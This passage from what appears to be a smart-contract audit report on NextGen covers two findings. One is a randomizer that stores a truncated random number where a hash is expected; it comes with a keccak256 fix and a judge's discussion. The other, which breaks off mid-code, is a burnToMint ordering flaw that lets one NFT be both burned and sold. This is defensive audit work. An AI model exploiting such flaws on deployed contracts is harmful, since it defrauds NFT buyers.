0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1627\">[M-02] The <code>RandomizerVRF</code> and <code>RandomizerRNG</code> do not produce hash value.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1627\">Haipls</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1757\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688\">PetarTolev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1349\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/852\">VAD37</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/816\">gumgumzum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/218\">Draiakoo</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1606\">ast3ros</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1181\">00xSEV</a></em></p>\n<p>According to documentation and other randomizer implementations, Randomizers are expected to set a random <code>HASH</code> for the minted tokens.</p>\n<p>However, the implementation mistakenly uses bytes32 in the format:</p>\n<ul>\n<li><code>bytes32(abi.encodePacked(numbers, requestToToken[id])</code> or</li>\n<li><code>bytes32(abi.encodePacked(_randomWords, requestToToken[_requestId]))</code>.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">10</span><span class=\"mtk1\">-</span><span class=\"mtk12\">nextgen</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RandomizerVRF</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillRandomWords</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">gencoreContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setTokenHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIdToCollection</span><span class=\"mtk1\">[</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">]], </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">], </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">,</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RequestFulfilled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">10</span><span class=\"mtk1\">-</span><span class=\"mtk12\">nextgen</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RandomizerRNG</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillRandomWords</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numbers</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">gencoreContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setTokenHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIdToCollection</span><span class=\"mtk1\">[</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">]], </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">], </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">numbers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>The hash is calculated as <code>bytes32</code> from <code>abi.encodePacked</code> of the <code>random number</code> and <code>tokenId</code>.</p>\n<p>Key observations:</p>\n<ol>\n<li><code>bytes32</code> truncates the result of <code>abi.encodePacked(numbers, requestToToken[id]</code>) and <em>only considers the first element of the random numbers array</em>.</li>\n<li>The random number is directly passed to <code>setTokenHash</code>. <em>It is not a hash</em>, and the second parameter meant to contribute to the hash creation is ignored.</li>\n<li>Now, the tokenâ€™s hash is directly dependent on the provided number.</li>\n</ol>\n<p>Thus, these contracts only pass the random number instead of generating a hash value.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L66\">https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L66</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L49\">https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L49</a></li>\n</ul>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>Example:</p>\n<p>If <code>_randomWords = [1, 2]</code> and <code>requestToToken = 1000</code>,\nthe result will be <code>0x0000000000000000000000000000000000000000000000000000000000000001</code>, which equals only the first provided random number.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">10</span><span class=\"mtk1\">-</span><span class=\"mtk12\">nextgen</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RandomizerVRF</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillRandomWords</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">gencoreContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setTokenHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIdToCollection</span><span class=\"mtk1\">[</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">]], </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">], </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">,</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RequestFulfilled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">10</span><span class=\"mtk1\">-</span><span class=\"mtk12\">nextgen</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RandomizerRNG</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillRandomWords</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numbers</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">gencoreContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setTokenHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIdToCollection</span><span class=\"mtk1\">[</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">]], </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">], </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">numbers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>HardHat</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>At a minimum, calculate the hash from the provided data using <code>keccak256</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: 2023-10-nextgen\\smart-contracts\\RandomizerVRF.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:     function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-66:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+66:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], keccak256(abi.encodePacked(_randomWords,requestToToken[_requestId])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">67:         emit RequestFulfilled(_requestId, _randomWords);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">68:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">69: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: 2023-10-nextgen\\smart-contracts\\RandomizerRNG.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">48:     function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers, requestToToken[id])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], keccak256(abi.encodePacked(numbers, requestToToken[id])));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">50:     }</span></span></span></code></pre>\n<p>This change will ensure compliance with documentation and consider all data involved in the hash creation process.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1823861588\">a2rocket (NextGen) confirmed via duplicate issue #1688</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1848332019\">aslanbek (warden) commented via duplicate issue #1688</a>:</strong></p>\n<blockquote>\n<p>I believe this report contradicts itself: </p>\n<p>The <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol\">RandomizerVRF</a> and <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol\">RandomizerRNG</a> contracts will not return random hashes, instead, they will only return the generated random number.</p>\n<p>This results in non-unique/duplicated tokenHash values and non-randomly generated NFTs. How can two random numbers not being hashed result in non-randomly generated NFTs?</p>\n<p>Thereâ€™s indeed a discrepancy between the spec and implementation, but not fixing the issue will simply result in tokens having a random <code>tokenToHash</code> anyway, which is sufficient for correct functioning of the protocol. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1848368235\">d3e4 (warden) commented via duplicate issue #1688</a>:</strong></p>\n<blockquote>\n<p>Only one random number is requested, so nothing is trimmed away. Hashing a random <code>256-bit</code> value does not make it any more random, it is just an arbitrary bijection. A random number and a hash digest (of an unknown or random number) are equivalent. It is randomness that is sought, not the output of specifically a hash function.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1848416930\">0xsomeone (judge) commented via duplicate issue #1688</a>:</strong></p>\n<blockquote>\n<p>@aslanbek and @d3e4, thanks for your feedback! Let me address both of your points:</p>\n<p><strong>Report Contradiction</strong> - Indeed the report contradicts itself, however, it was the sole submission of this issue and as such is the primary one. </p>\n<p><strong>Randomness Impact</strong> - A value not being hashed does not impact its randomness, however, it does impact the range the values will be present in. As such, it allows the â€œexpansionâ€ of a randomness range to cover the full <code>uint256</code> value range. For example, if the randomness values are in a sub-range <code>[X,Y]</code>, the randomness oracles will produce token IDs solely in that range. </p>\n<p>If a hash function is utilized (such as <code>keccak256</code>), the range will be expanded to <code>[0, type(uint256).max]</code> which is the desirable outcome. This is further illustrated by the fact that the <code>tokenHash</code> entry specifies it should be a hash.</p>\n<p><strong>ARRNG-Specific Impact</strong> - Another important trait of hashing is the minimization of monobit bias. A monobit bias occurs when a single bit in the randomness output is more frequently <code>0</code> or <code>1</code> in relation to the rest of the bits. This is especially prevalent in random sources such as ARRNG which rely on radio waves and other real-world data that may bias their measurements.</p>\n<p>A hash will induce the avalanche effect whereby a bit will have a rough chance of being flipped. As such, monobit bias is somewhat eliminated by using hashing functions. While I wonâ€™t criticize Chainlink, the ARRNG service relies on <code>RANDOM.ORG</code> which provides publicly accessible data showcasing its monobit bias.</p>\n<p><strong>Chainlink-Specific Impact</strong> - The Chainlink oracle of NextGen is defined to have the <code>numWords</code> requested as updateable. This is very useful when the perceived entropy of random numbers is small; specifically, a hash of multiple lower-than-maximum (<code>256</code> in this case) entropy numbers will â€œcompressâ€ the entropy (with some loss of course) into 32 bytes. As an example, hashing two numbers with <code>16</code> and <code>19</code> bits of entropy each will produce an output that has their entropy combined minus one to account for entropy lost due to compression and collisions.</p>\n<p>As the <code>numWords</code> variable can be updated, we can see a problem in the codebase whereby any value of <code>numWords</code> greater than one will not increase the entropy of the randomness generator as expected. </p>\n<p><strong>Closing Thought</strong> - Given that the code contains an egregious error that directly impacts its functionality, I will maintain the current medium risk rating. The <code>tokenHash</code> mapping is expected to contain a hash, and assigning it otherwise is an invariant that is broken. I will consider inviting other judges to contribute to this particular judgment. </p>\n</blockquote>\n<p><em>Note: For full discussion, see <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688\">here</a>.</em></p>\n<hr>\n<h2 id=\"m-03-vulnerability-in-burntomint-function-allows-double-use-of-nft\" style=\"position:relative;\"><a href=\"#m-03-vulnerability-in-burntomint-function-allows-double-use-of-nft\" aria-label=\"m 03 vulnerability in burntomint function allows double use of nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597\">[M-03] Vulnerability in <code>burnToMint</code> function allows double use of NFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597\">ast3ros</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1533\">smiling_heretic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1227\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1198\">Jiamin</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/694\">Al-Qa-qa</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/571\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2052\">ustas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2022\">rishabh</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1988\">CaeraDenoir</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1199\">00xSEV</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1039\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/949\">gumgumzum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/778\">crunch</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/527\">Juntao</a></em></p>\n<p>The current implementation of the <code>burnToMint</code> function in the <code>NextGenCore.sol</code> smart contract permits a contract holder to both burn and sell the same NFT, effectively exploiting it to mint a new NFT. This leads to potential fraudulent activities when trading the NFT.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The vulnerability stems from the order of operations in the <code>burnToMint</code> function. Currently, a new token is minted (<code>_mintProcessing</code>) before the existing token is burned (<code>_burn</code>). This sequence of operations opens a window for exploitation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burnToMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_burnCollectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burner</span><span class=\"mtk1\">) </span><span 